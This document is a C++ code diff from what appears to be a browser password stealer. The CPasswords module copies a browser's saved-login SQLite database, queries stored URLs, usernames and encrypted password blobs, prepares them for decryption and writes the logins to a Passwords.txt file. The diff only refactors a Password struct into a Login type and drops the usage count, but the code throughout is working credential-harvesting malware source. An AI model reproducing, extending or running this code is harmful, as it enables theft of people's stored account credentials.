@@ -11,7 +11,7 @@ void CPasswords::execute(const fs::path &root, const std::string &name, const fs
     if(!exists(copied_db))
         return;
 
-    std::list<Password> history = this->getPasswords(copied_db);
+    std::list<Login> history = this->getPasswords(copied_db);
 
     fs::remove(copied_db);
 
@@ -20,23 +20,19 @@ void CPasswords::execute(const fs::path &root, const std::string &name, const fs
 
     std::stringstream ss;
 
-    for(const Password &row : history)
+    for(Login &row : history)
     {
         if(row.password.empty() && row.username.empty())
             continue;
 
-        ss << "Url: " << row.origin << "\n";
-        ss << "  Username: " << row.username << "\n";
-        ss << "  Password: " << row.password << "\n";
-        ss << "  Used: " << std::to_string(row.times_used) << " times\n";
-        ss << "\n";
+        row.write(ss);
     }
 
     Utils::writeFile(root / "Passwords.txt", ss.str(), true);
 }
 
-std::list<Password> CPasswords::getPasswords(const fs::path &db_path) {
-    std::list<Password> passwordList;
+std::list<Login> CPasswords::getPasswords(const fs::path &db_path) {
+    std::list<Login> passwordList;
     sqlite3* db;
     sqlite3_stmt* stmt;
     int rc;
@@ -46,7 +42,7 @@ std::list<Password> CPasswords::getPasswords(const fs::path &db_path) {
         return {};
     }
 
-    const char* sql = "SELECT origin_url, username_value, password_value, times_used FROM logins ORDER BY times_used DESC";
+    const char* sql = "SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used DESC";
     rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
     if (rc != SQLITE_OK) {
         sqlite3_close(db);
@@ -58,12 +54,10 @@ std::list<Password> CPasswords::getPasswords(const fs::path &db_path) {
         const unsigned char* username_value = sqlite3_column_text(stmt, 1);
         const void* password_value = sqlite3_column_blob(stmt, 2);
         int password_size = sqlite3_column_bytes(stmt, 2);
-        int times_used = sqlite3_column_int(stmt, 3);
 
-        Password password_record;
+        Login password_record;
         password_record.origin = std::string(reinterpret_cast<const char*>(origin_url));
         password_record.username = std::string(reinterpret_cast<const char*>(username_value));
-        password_record.times_used = times_used;
 
         std::vector<BYTE> password_encrypted;
         password_encrypted.assign(static_cast<const BYTE*>(password_value), static_cast<const BYTE*>(password_value) + password_size);
